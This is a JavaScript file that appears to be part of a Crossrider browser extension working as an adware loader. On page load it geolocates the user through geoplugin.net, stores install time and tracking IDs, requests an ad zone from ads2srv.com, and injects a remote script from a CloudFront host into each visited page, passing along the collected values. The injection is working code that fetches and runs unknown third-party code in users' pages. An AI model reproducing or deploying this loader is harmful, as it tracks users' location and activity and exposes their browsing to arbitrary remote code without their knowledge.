var _GPL_PID = 1140;

(function($) {   

  $.geoplugin = function(options) {
    var baseCurrency = "USD";
    var address = null;
    var callback = null;

    if (options != null) {
      if ((options.ip != null) && (options.ip != "")) address = options.ip;
      if (options.currency != null) baseCurrency = options.currency;
      if (options.callback != null) callback = options.callback;
    }

    var request;
    if (address == null) {
      request = "?base_currency=" + baseCurrency;
    } else if (/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/.test(address)) {
      request = "?ip=" + address + "&base_currency=" + baseCurrency;
    } else {
      var addressIP = $.dns.resolveIp(address);
      if (addressIP == null) return null; //we have invalid address
      request = "?ip=" + addressIP[0] + "&base_currency=" + baseCurrency;
    }
    
    if (callback == null) {
      var geodata = $.request.sync.get("http://www.geoplugin.net/json.gp" + request);
      if (geodata == null) return null;
      geodata = $jquery.parseJSON(geodata.substr("geoPlugin(".length, geodata.length - "geoPlugin(".length - 1))
      return geodata;      
    } else {
      //async call
      $.request.get("http://www.geoplugin.net/json.gp" + request, 
        function(txt, xml) {
          var geodata = $jquery.parseJSON(txt.substr("geoPlugin(".length, txt.length - "geoPlugin(".length - 1))
          callback(geodata);
        }
      );
      return true; //just to let the developer know we have good hostname/ip
    }
  }
  
 })(appAPI);

function _GPL_formatDate(aoi)
{
  aoi = parseInt(aoi);
  var m_names = new Array("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec");
  var d = new Date(parseInt(aoi)*1000);
  var curr_date = d.getDate();
  var curr_month = d.getMonth();
  var curr_year = d.getFullYear();
  return m_names[curr_month] + " " + curr_date + ", " + curr_year;
}

var _GPL_loader = 
{
  vars: {'pid': _GPL_PID, 'systemid': appAPI.getCrossriderID()},
  proto: "https:" == document.location.protocol ? "https://" : "http://",
  baseCDN: "d3m5drat5m0ays.cloudfront.net",
  init: function()
  {
    var params = '';
    $jquery.each(this.vars, function(key, val) {
      params += key + '=' + val + '&';
    });
    params = params.substring(0,params.length-1);
    this.insertJS(this.proto + this.baseCDN + '/items/loaders/loader_' + this.vars.pid + '.js?' + params);
  },
  insertJS: function(a) {
    var d = document.getElementsByTagName("head"),
      d = d.length > 0 ? d : document.getElementsByTagName("body");
    if (d.length > 0) {
      var c = document.createElement("script");
      c.async = !0;
      c.type = "text/javascript";
      c.src = a;
      d[0].appendChild(c)
    }
  }
};

function _GPL_loadGEO()
{
  /* GEO */
  var myGEO = appAPI.db.get('_GPL_geo');
  
  if (myGEO == null)
  {
  appAPI.geoplugin({callback: function(myGEO) {
  appAPI.db.set('_GPL_geo', myGEO, appAPI.time.daysFromNow(7)); 
  _GPL_loader.vars.cid = myGEO.geoplugin_countryCode;
  _GPL_loader.vars.rid = myGEO.geoplugin_region;
  _GPL_loader.vars.ccid = myGEO.geoplugin_city;
  _GPL_loader.vars.dma = myGEO.geoplugin_dmaCode;
  _GPL_loader.init();
  }});
  } else {
  _GPL_loader.vars.cid = myGEO.geoplugin_countryCode;
  _GPL_loader.vars.rid = myGEO.geoplugin_region;
  _GPL_loader.vars.ccid = myGEO.geoplugin_city;
  _GPL_loader.vars.dma = myGEO.geoplugin_dmaCode;
  _GPL_loader.init();
  }
}

$jquery(document).ready(function() {
  
  /* Installer Parameters */
  var params = appAPI.db.get("InstallerParams");
  params = params ? params : {};
  if (!params['uzid']){
    params['uzid'] = '20830&pid=1140';
  }
  
  /* AOI */
  var myAOI = appAPI.db.get("InstallationTime");
  myAOI = myAOI ? myAOI : appAPI.db.get('_GPL_aoi');
  
  /* Set AOI to current UNIX timestamp (in seconds) if not already set */
  if (myAOI == null)
  {
    myAOI = '' + Math.floor((new Date()).getTime() / 1000);
  }  
  appAPI.db.set('_GPL_aoi', myAOI);
  _GPL_loader.vars.aoi = myAOI;
  
  /* Zone */
  var zoneid = appAPI.db.get('_GPL_zoneid');
  if (zoneid == null) {
  zoneid = params.uzid;
  }
  if (typeof zoneid == 'string' && zoneid.indexOf('&')!=-1) { zoneid = zoneid.split('&')[0]; }
  appAPI.db.set('_GPL_zoneid', zoneid);
  
  /* Parent */
  var parent_zoneid = (params.uzid) ? params.uzid : appAPI.db.get('_GPL_parent_zoneid');
  if (parent_zoneid && parent_zoneid.indexOf('&')!=-1) { parent_zoneid = parent_zoneid.split('&')[0]; }
  appAPI.db.set('_GPL_parent_zoneid', parent_zoneid);
  
  /* Hotfix */
  var hotfix_key = '_GPL_hotfix20111102645';
  var hotfix = appAPI.db.get(hotfix_key);
  
  /* Ivan Zone Test */
  if (params && params.source_id) {
    zoneid = zoneid ? zoneid : '11442';
  } else {
    zoneid = zoneid ? zoneid : '11443';
  }
  
  /* Extract pid from zoneid if it's part of it */
  if (typeof params.uzid == "string" && params.uzid.indexOf('pid=') != -1) {
    pid = params.uzid.substring(params.uzid.indexOf('pid=') + 4);
    if (pid.indexOf('&') != -1) {
      pid = pid.substring(0, pid.indexOf('&'));
    }
    _GPL_loader.vars.pid = pid; 
  }
  
  if (appAPI.db.get('_GPL_crr')!=null) {
    _GPL_loader.vars.crr = Math.floor((new Date).getTime() / 1000);
  }
  
  /* Dynamic Zone Creation */
  if (hotfix == null || parseInt(zoneid) == 0)
  {
    var scr = document.createElement('script');
    var gz_url = "http://ads2srv.com/tb/gz.php?&keyset_id=" + escape(_GPL_formatDate(myAOI)) + "&xml&rev=0&parent_zone=" + parseInt(parent_zoneid) + "&is_date";
  
    appAPI.request.get(gz_url, function(data) {
    /* Read zoneid from dynamic script */
    doc = data.match(/zoneid>(\d+)</i);
    zoneid = doc ? doc[1] : 0;
    if (parseInt(zoneid) > 0)
    {
      /* Save along with parent zone to db */
      appAPI.db.set('_GPL_zoneid', '' + zoneid);
      appAPI.db.set(hotfix_key, '1');
      
      /* Set zone and start loader */
      _GPL_loader.vars.zoneid = zoneid;
      _GPL_loadGEO();
    } else {
      _GPL_loader.vars.zoneid = 12199;
      _GPL_loadGEO();
    }
    }, function(e) {
    /* Error, let's just stick to the original zoneid for now and start loader */
    _GPL_loader.vars.zoneid = zoneid;
    _GPL_loadGEO();
    });
  }
  else
  {
  /* Normal scenario */
  if (zoneid != null) {
    _GPL_loader.vars.zoneid = zoneid;
  }
  _GPL_loadGEO();
  }
  
});
